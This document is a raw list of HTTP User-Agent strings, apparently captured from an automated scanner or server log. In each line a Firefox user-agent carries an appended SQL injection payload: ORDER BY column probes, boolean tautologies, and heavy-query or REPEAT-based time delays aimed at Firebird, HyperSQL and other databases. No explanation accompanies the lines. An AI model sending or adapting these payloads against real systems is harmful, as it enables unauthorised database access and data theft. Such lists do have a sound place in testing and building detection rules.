Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 ORDER BY 1335-- BWRk
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') ORDER BY 1-- YDFe
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) ORDER BY 7568-- Akev
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) ORDER BY 8527-- ZIKU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 1-- PRko
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 5532-- TETl
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') ORDER BY 5133-- DnTw
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) ORDER BY 1-- JjyB
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) ORDER BY 7523-- viUW
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) ORDER BY 4778-- beSV
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 9123-- xTls
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) ORDER BY 6255-- iDaE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) ORDER BY 1-- NKxv
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) ORDER BY 1257-- Hkvk
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 ORDER BY 1-- mBhl
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) ORDER BY 1951-- tQhs
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) ORDER BY 1035-- HNdm
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 ORDER BY 1-- SLYl
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 ORDER BY 5299-- lrGu
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS jHuL WHERE 8890=8890 ORDER BY 1-- VpKU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS YBAJ WHERE 9687=9687 ORDER BY 3115-- pZon
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS XGTb WHERE 5720=5720 ORDER BY 1-- msxE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS ZivO WHERE 3117=3117 ORDER BY 1-- XItt
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS gCXP WHERE 2678=2678 ORDER BY 1-- morM
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS nrPw WHERE 8334=8334 ORDER BY 4714-- Oxxw
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS XqGQ WHERE 5731=5731 ORDER BY 9682-- BkXO
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 7194=7194 ORDER BY 1-- WDsP
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 1996=1996 ORDER BY 6660-- uMGN
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) ORDER BY 1-- kuNE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) ORDER BY 1#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 1#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 ORDER BY 8029#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') ORDER BY 9622#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) ORDER BY 8181#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 2943#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) ORDER BY 1621#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17%' ORDER BY 3110#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' ORDER BY 4607#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) ORDER BY 9853#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) ORDER BY 3085#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) ORDER BY 5686#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) ORDER BY 3604#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) ORDER BY 7395#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 ORDER BY 7597#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS CyyU WHERE 4573=4573 ORDER BY 1#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS vwAE WHERE 5308=5308 ORDER BY 7727#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS zwGO WHERE 3579=3579 ORDER BY 6740#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS ZmVS WHERE 4811=4811 ORDER BY 1#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS iSyd WHERE 6657=6657 ORDER BY 8988#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS Fksp WHERE 4947=4947 ORDER BY 4767#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 9115=9115 ORDER BY 1#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 8250=8250 ORDER BY 1#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND (3895=3895
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND (((6450=6450
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND (\x22jMlq\x22 LIKE \x22jMlq
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)# WssF
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 2681=2681 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)-- FuWm
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT TlCi WHERE 9153=9153 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4))+'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT YErc FROM DUAL WHERE 3664=3664 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT SVpf WHERE 3085=3085 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS zZqo WHERE 2577=2577 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)-- AKXZ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT loSA WHERE 5918=5918 AND 6411=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT apMh WHERE 7019=7019 AND 6411=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS wZND WHERE 2000=2000 AND 6411=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 3019=3019 OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 4504=4504 OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 2516=2516 OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- mFYw
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- QbzK
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (((7422=7422
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ('mOaw' LIKE 'mOaw
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (((\x22kzzy\x22=\x22kzzy
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT QQqV WHERE 6736=6736 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))+
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS bwwg WHERE 9586=9586 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- yUuf
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS SfcM WHERE 1563=1563 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- YynY
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ((('lgAc'='lgAc
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17%' OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND 'KOGZ%'='KOGZ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) OR 'SJXp'='nrBp
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 1214=1214 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- EdYQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 6158=6158 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- pGkp
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT pnex WHERE 8657=8657 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT gvMS WHERE 3693=3693 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))+'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS krLm WHERE 2160=2160 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- BCqq
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS hBvh WHERE 9703=9703 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- JEhI
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS JCcG WHERE 3130=3130 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- Zkie
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS iAOS WHERE 3898=3898 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- JkrE
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)#
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 9724=9724 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 1747=1747 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT dhvE WHERE 4650=4650 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT ydsq FROM DUAL WHERE 8089=8089 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS AJuU WHERE 7635=7635 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 1716=1716 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS AgiC WHERE 9123=9123 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS Wuvc WHERE 3350=3350 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL) AND (7608=7608
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL) AND 'cKjz' LIKE 'cKjz
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL) AND (\x22fIYU\x22 LIKE \x22fIYU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22))) AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL) AND (((\x22uFdn\x22 LIKE \x22uFdn
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 7251=7251 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL)-- lyri
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS VyiT WHERE 2008=2008 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL)-- lDdj
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 7578=7578 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL)-- ZULH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- jLOn
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND ((('AlSe'='AlSe
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND 'wTPS'='wTPS
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND ((('DOiL' LIKE 'DOiL
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND ((\x22PfYy\x22=\x22PfYy
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- MzKQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 3977=3977 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- bplW
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(105)||CHAR(98)||CHAR(112)||CHAR(103) WHERE 6257=6257 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 6598=6598 AND CHAR(117)||CHAR(108)||CHAR(106)||CHAR(81)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8765),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 6241=6241 AND CHAR(117)||CHAR(108)||CHAR(106)||CHAR(81)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8765),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS lJMm WHERE 2925=2925 AND CHAR(117)||CHAR(108)||CHAR(106)||CHAR(81)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8765),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) AS SxMT WHERE 9414=9414 AND CHAR(117)||CHAR(108)||CHAR(106)||CHAR(81)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8765),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) AND CHAR(117)||CHAR(108)||CHAR(106)||CHAR(81)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8765),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 5127=5127 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
